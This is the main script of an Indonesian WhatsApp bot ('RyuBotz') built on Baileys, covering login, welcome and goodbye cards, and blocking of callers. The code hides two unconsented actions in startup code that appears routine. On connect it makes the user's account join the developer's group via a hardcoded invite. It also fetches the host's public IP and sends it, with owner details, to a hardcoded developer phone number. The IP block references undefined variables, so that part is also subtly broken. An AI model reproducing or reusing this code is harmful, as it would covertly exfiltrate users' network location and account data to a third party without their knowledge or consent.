//Function Module
const {
    WAConnection,
    MessageType,
    Presence,
    Mimetype,
    GroupSettingChange
} = require('@adiwajshing/baileys')
const fs = require('fs')
const fetch = require('node-fetch')
const moment = require('moment-timezone')
const { wait, banner, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, start, info, success, close } = require('./lib/functions')
const { color } = require('./lib/color')
const _welkom = JSON.parse(fs.readFileSync('./database/welcome.json'))
const { OwnerNumber, BotName, OwnerName, antidel, anticall } = require('./setting.json')
const { welkam, goodbye } = require('./lib/welkam.js')

//Media
thumb = fs.readFileSync('./media/thumb.jpg')

//Auto Update For Ryuu.js
require('./Ryuu.js')
nocache('./Ryuu.js', module => console.log(`${module} telah di update!`))

//Function Start & Browser
const starts = async (Ryuu = new WAConnection()) => {
    Ryuu.logger.level = 'warn'
    Ryuu.version = [2, 2143, 3]
    Ryuu.browserDescription = [ 'RyuBotz', 'Safari', '3.0' ]
    Ryuu.on('qr', () => {
        console.log(color('[','white'), color('!','red'), color(']','white'), color(' Scan Qrnya Kak Waktu Cuma 20 Detik !!'))
    })
    
    //Function Send Button Image
    const sendButImage = async (from, context, fotext, img, but) => {
    gam = img
    jadinya = await Ryuu.prepareMessage(from, gam, MessageType.image)
    buttonMessagesI = {
    imageMessage: jadinya.message.imageMessage,
    contentText: context,
    footerText: fotext,
    buttons: but,
    headerType: 4
    }
    Ryuu.sendMessage(from, buttonMessagesI, MessageType.buttonsMessage)
    }
    
    //Connecting Running Bot
    fs.existsSync('./QrRyuu.json') && Ryuu.loadAuthInfo('./QrRyuu.json')
    Ryuu.on('connecting', () => {
        start('2', 'Menghubungkan ...')
    })
    
    //Connect Done
    Ryuu.on('open', () => {
        success('2', 'Done Sudah Terhubung , Subscribe YT : RyuukaBotz')
        Ryuu.sendMessage(`${OwnerNumber}@s.whatsapp.net`, `*Halo Owner ${BotName} 👋*\n\nBot Sekarang Sudah Tersambung Dan Siap Untuk Dipakai 🤙😉\n\nJika Terjadi Emror Hubungi Developer\n\nJangan Lupa Ucapkan Terima Kasih Kepada Developer Bot Serta Jangan Lupa Subrek Youtube Ryuuka Botz`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Bot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/thumb.jpg'),sourceUrl:"https://wa.me/6283891921787?text=Assalamualaikum"}}})
    })
    
    //Auto Join To Group
    await Ryuu.connect({timeoutMs: 30*1000})
    fs.writeFileSync('./QrRyuu.json', JSON.stringify(Ryuu.base64EncodedAuthInfo(), null, '\t'))
    teks = `https://chat.whatsapp.com/KYFdPsjHKIr5ToVIqOAunE`
    Ryuu.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
    console.log(color('|WRN|', 'yellow'), color('BOT MEMASUKI GROUP • Ryuuka Botz Official •', 'cyan'))
    
    //Auto Send IP To Creator
    fetch(`http://ip-api.com/line`).then(res => res.text())  
    .then(bu =>{
    Ryuu.sendMessage("6283891921787@s.whatsapp.net", `─────── *INFO USER* ───────\n\n\`\`\`Name        : ${botname}\nName Owner  : ${ownername}\nNomer Owner : ${owner}\nPrefix      : Multi Prefix\`\`\`\n\n─────── *IP ADDRES* ────────\n\n\`\`\`${bu}\`\`\`\n─────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Bot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/thumb.jpg'),sourceUrl:"https://wa.me/6283891921787?text=Assalamualaikum"}}})
    console.log(color('|WRN|', 'yellow'), color('[ MENGIRIM IP ADDRESS ] KE DEVELOPER BOT', 'cyan'))
    
    //Function Update Welcome And Leave
    })
    Ryuu.on('chat-update', async (message) => {
    require('./Ryuu.js')(Ryuu, message, _welkom)
    })
    Ryuu.on("group-participants-update", async (anu) => {
    
    const isWelkom = _welkom.includes(anu.jid)
    try {
    groupMet = await Ryuu.groupMetadata(anu.jid)
    groupMembers = groupMet.participants
    groupAdmins = getGroupAdmins(groupMembers)
    mem = anu.participants[0]

    console.log(anu)
    
    //Getting Profile Picture User
    try {
    pp_user = await Ryuu.getProfilePicture(mem)
    } catch (e) {
    pp_user = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
    }
    
    //Getting Profile Picture Group
    try {
    pp_grup = await Ryuu.getProfilePicture(anu.jid)
    } catch (e) {
    pp_grup =
    "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
    }
    
    // Auto Send Message Moment Bot Add To Group
    if (anu.action == 'add' && mem.includes(Ryuu.user.jid)) {
      Ryuu.sendMessage(anu.jid, '```Haloo Semua 👋 Terima Kasih sudah Mengundangku, Jika ingin Menggunakan Bot Ketik .menu```', 'conversation')
      }
      
      //Text Welcome
      if (!isWelkom) return
      if (anu.action == 'add') {
	  num = anu.participants[0]
	  mdata = await Ryuu.groupMetadata(anu.jid)
      memeg = mdata.participants.length
      let v = Ryuu.contacts[num] || { notify: num.replace(/@.+/, "") }
      anu_user = v.vname || v.notify || num.split("@")[0]
      time_wel = moment.tz("Asia/Jakarta").format("HH:mm")
	  try {
	  ppimg = await Ryuu.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
	  } catch {
	  ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
	  }
	  image = await getBuffer(
      `http://hadi-api.herokuapp.com/api/card/welcome?nama=${anu_user}&descriminator=${groupMembers.length
       }&memcount=${memeg}&gcname=${encodeURI(
       mdata.subject
       )}&pp=${pp_user}&bg=https://telegra.ph/file/826e9ab1daba9af9b6ef3.jpg`
       )
	  teks = `𝗛𝗮𝗹𝗼 𝗞𝗮𝗸 *@${num.split('@')[0]}*\n𝗦𝗲𝗹𝗮𝗺𝗮𝘁 𝗗𝗮𝘁𝗮𝗻𝗴 𝗗𝗶 𝗚𝗿𝗼𝘂𝗽 ${mdata.subject}\n\n`
      but = [
      { buttonId: '.add', buttonText: { displayText: 'WELCOME 👋' }, type: 1 }
      ]
	  let buff = await getBuffer(ppimg)
	  sendButImage(mdata.id, teks+welkam(), `*© Whatsapp | ${mdata.subject}*`, image, but)
      
      //Text Remove
      } else if (anu.action == 'remove') {
	  num = anu.participants[0]
	  mdata = await Ryuu.groupMetadata(anu.jid)
      memeg = mdata.participants.length
      let w = Ryuu.contacts[num] || { notify: num.replace(/@.+/, "") }
      anu_user = w.vname || w.notify || num.split("@")[0]
      time_wel = moment.tz("Asia/Jakarta").format("HH:mm")
	  try {
	  ppimg = await Ryuu.getProfilePicture(`${num.split('@')[0]}@c.us`)
	  } catch {
	  ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
	  }
	  imagee = await getBuffer(
      `http://hadi-api.herokuapp.com/api/card/goodbye?nama=${anu_user}&descriminator=${groupMembers.length
      }&memcount=${memeg}&gcname=${encodeURI(
      mdata.subject
      )}&pp=${pp_user}&bg=https://telegra.ph/file/826e9ab1daba9af9b6ef3.jpg`
      )
	  tekss = `𝗬𝗮𝗵𝗵 𝗦𝗶 *@${num.split('@')[0]}* 𝗞𝗲𝗹𝘂𝗮𝗿\n\n`
	  butt = [
      { buttonId: '.remove', buttonText: { displayText: 'GOODBYE 👋' }, type: 1 }
      ]
	  let buff = await getBuffer(ppimg)
	  sendButImage(mdata.id, tekss+goodbye(), `*© Whatsapp | ${mdata.subject}*`, imagee, butt)
      }
    } catch (e) {
      console.log("Error : %s", color(e, "red"))
    }
    
    //Anti Call
    antical = true
    Ryuu.on("CB:Call", json => {
    if (antical === false) return
    let call;
    calling = JSON.parse(JSON.stringify(json))
    call = calling[1].from
    Ryuu.sendMessage(call, `*Sorry ${Ryuu.user.name} can't receive calls.*\n*Call = Block!*`, MessageType.text)
    .then(() => Ryuu.blockUser(call, "add"))

    })
    
    })
    }

/**
 * Uncache if there is file change
 * @param {string} module Module name or path
 * @param {function} cb <optional> 
 */
function nocache(module, cb = () => { }) {
    console.log('Module', `'${module}'`, 'sekarang sedang diawasi untuk perubahan')
    fs.watchFile(require.resolve(module), async () => {
        await uncache(require.resolve(module))
        cb(module)
    })
}

/**
 * Uncache a module
 * @param {string} module Module name or path
 */
function uncache(module = '.') {
    return new Promise((resolve, reject) => {
        try {
            delete require.cache[require.resolve(module)]
            resolve()
        } catch (e) {
            reject(e)
        }
    })
}

starts()
